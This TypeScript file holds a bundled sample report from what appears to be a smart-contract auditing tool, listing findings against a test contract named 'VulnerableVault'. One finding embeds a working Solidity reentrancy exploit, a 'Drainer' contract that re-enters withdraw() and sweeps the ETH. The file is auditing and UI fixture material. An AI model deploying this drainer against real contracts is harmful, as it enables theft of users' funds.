import type { AuditReport } from "./types";

// Bundled sample (real `exploitforge -report-json` output) so the UI renders
// with no backend. In dev/prod it first tries to fetch ./audit.json and falls
// back to this.
export const sampleAudit: AuditReport = {
  "target": "VulnerableVault",
  "provider": "claude",
  "model": "claude-sonnet-5-5",
  "summary": {
    "total": 2,
    "verified": 1,
    "rejected": 1,
    "inconclusive": 0
  },
  "findings": [
    {
      "id": "H1",
      "class": "reentrancy",
      "contract": "VulnerableVault",
      "function": "withdraw",
      "verdict": "verified",
      "reason": "exploit verified in 1 attempt(s)",
      "confidence": 0.9,
      "impact": "attacker ETH balance strictly increases",
      "successAssertion": "assertGt(attacker.balance, preAttackerBalance, \"no profit\");",
      "claimsProfit": true,
      "attackSteps": [
        "deposit",
        "withdraw",
        "re-enter from receive before balance is zeroed"
      ],
      "evidenceNotes": [
        "success invariant is meaningful and was broken by the exploit (forge PASS on a guarded predicate)",
        "independent value-flow corroboration: attacker cluster netted 6000000000000000000 wei",
        "mechanism detail: confirmed re-entry — node #8 is a call into the target nested inside still-open node #6"
      ],
      "valueFlowWei": 6000000000000000000,
      "reentrancyConfirmed": true,
      "attempts": 1,
      "poc": "function attack() internal {\n        Drainer d = new Drainer(target);\n        (bool ok, ) = address(d).call{value: 1 ether}(\"\");\n        require(ok, \"fund failed\");\n        d.run();\n        d.sweep();\n    }\n}\n\ncontract Drainer {\n    VulnerableVault public target;\n    bool internal attacking;\n    uint8 internal depth;\n    constructor(VulnerableVault _t) { target = _t; }\n    function run() external {\n        attacking = true;\n        target.deposit{value: address(this).balance}();\n        target.withdraw();\n        attacking = false;\n    }\n    function sweep() external {\n        (bool ok, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(ok);\n    }\n    receive() external payable {\n        if (attacking \u0026\u0026 depth \u003c 5 \u0026\u0026 address(target).balance \u003e= 1 ether) {\n            depth++;\n            target.withdraw();\n        }\n    }\n"
    },
    {
      "id": "H2",
      "class": "access-control",
      "contract": "VulnerableVault",
      "function": "deposit",
      "verdict": "rejected",
      "reason": "unprovable hypothesis: success assertion is trivially true (assertTrue(true)/assertFalse(false))",
      "confidence": 0.3,
      "impact": "handwave",
      "successAssertion": "assertTrue(true);",
      "claimsProfit": false,
      "attackSteps": [
        "call deposit"
      ],
      "evidenceNotes": [
        "success predicate rejected before execution: success assertion is trivially true (assertTrue(true)/assertFalse(false))"
      ],
      "valueFlowWei": 0,
      "reentrancyConfirmed": false,
      "attempts": 0
    }
  ]
}
;
